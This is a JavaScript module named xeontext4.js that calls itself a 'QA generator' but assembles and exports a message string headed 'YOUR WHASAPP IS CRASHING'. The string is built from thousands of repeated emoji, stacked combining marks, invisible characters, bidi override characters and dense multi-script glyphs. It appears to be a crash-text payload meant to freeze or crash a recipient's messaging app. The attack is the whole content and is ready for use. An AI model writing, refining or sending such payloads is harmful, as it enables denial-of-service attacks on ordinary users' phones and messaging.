/**
 * xeontext4.js – BALANCED HYBRID QA GENERATOR
 * ✔ Burst load (old style)
 * ✔ Structured complexity (new style)
 * ✔ Multi-script + CJK + rare glyphs
 * ✔ Combining + invisible + RTL
 * ✔ ZWJ emoji
 * ✔ Stable export (string)
 */

// ================= BASE =================

const BASE = [
  // Lao
  ..."ກຂຄງຈຊຍດຕນບປຜຝພຟມຢຣລວສຫອຮ",

  // Myanmar
  ..."ကခဂငစဆဇညဋဌဍဎဏတထဒဓနပဖဗဘမယရလဝသဟအ",

  // Tibetan
  ..."ཀཁགངཅཆཇཉཏཐདནཔཕབམཙཚཛཝཞཟའཡརལཤསཧཨ",

  // CJK
  "頂","夜","嗶","漢","字","語","文",

  // Rare
  "𠀀","𠜎","𡃁","𡈽","ꙮ","𓀀","🜁","𐍈",

  // Latin + symbols
  ..."ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "😭","😓","☠️","😢","😠","😟","💥","✨","✓","§","©","®"
];

// Combining marks
const CM = [
  "\u0300","\u0301","\u0302","\u0303","\u0304",
  "\u0310","\u0323","\u0330","\u0334","\u0335",
  "\u035C","\u0360","\u0361","\u0362"
];

// Invisible
const INVIS = [
  "\u200B","\u200C","\u200D","\u2060","\uFEFF"
];

// Emoji
const ZWJ = [
  "👩‍👩‍👧‍👧","👨‍👩‍👦","👩‍💻","🧑‍🚀"
];

// Bidi
const BIDI = {
  RTL: "\u202E",
  LTR: "\u202D",
  POP: "\u202C"
};

const rand = n => Math.floor(Math.random() * n);

// ================= GENERATORS =================

// heavy combining
function zalgo(str, layers = 10) {
  let out = str;
  for (let i = 0; i < layers; i++) {
    out += CM[rand(CM.length)];
  }
  return out;
}

// invisible block
function invisibleMix(n = 80) {
  let s = "";
  for (let i = 0; i < n; i++) {
    s += INVIS[rand(INVIS.length)];
  }
  return s;
}

// dense grapheme
function grapheme() {
  let ch = BASE[rand(BASE.length)];

  // combining stack
  const m = 2 + rand(5);
  for (let i = 0; i < m; i++) {
    ch += CM[rand(CM.length)];
  }

  // emoji injection
  if (Math.random() > 0.85) {
    ch += ZWJ[rand(ZWJ.length)];
  }

  // invisible
  if (Math.random() > 0.7) {
    ch += INVIS[rand(INVIS.length)];
  }

  return ch;
}

// structured unicode
function complexUnicode(n = 1200) {
  let out = "";
  for (let i = 0; i < n; i++) {
    out += grapheme();
  }
  return out;
}

// burst block (old style)
function burstBlock() {
  return (
    "💥".repeat(3000) +
    "A".repeat(5000) +
    "😭".repeat(2000)
  );
}

// repeated unicode block (old style)
function repeatedBlock() {
  const unit = "ລັ້ວ" + "ျှျ" + "ཧྷྐ";
  return Array(1500).fill(unit).join("");
}

// bidi mix
function bidiMix(text) {
  const mid = Math.floor(text.length / 2);
  return (
    BIDI.RTL + text.slice(0, mid) + BIDI.POP +
    invisibleMix(40) +
    BIDI.LTR + text.slice(mid) + BIDI.POP
  );
}

// ================= FINAL PAYLOAD =================

const xeontext4 =
  // small header
  "YOUR WHASAPP IS CRASHING\n" +

  // 🔥 burst load (instant pressure)
  burstBlock() + "\n" +

  // 🔥 repeated unicode (old strength)
  repeatedBlock() + "\n" +

  // 🧠 structured complexity
  complexUnicode(5000) + "\n" +

  // 🔀 bidi stress
  bidiMix(complexUnicode(6000)) + "\n" +

  // 👻 invisible tail
  invisibleMix(4000) + "\n" +

  // 🔥 zalgo signature
  zalgo("FINAL🔥", 3000) + "\n" +

  // emoji cluster
  ZWJ.join(" ") + "\n" +

  // final dense block
  complexUnicode(4000);

// ================= EXPORT =================

module.exports = { xeontext4 };
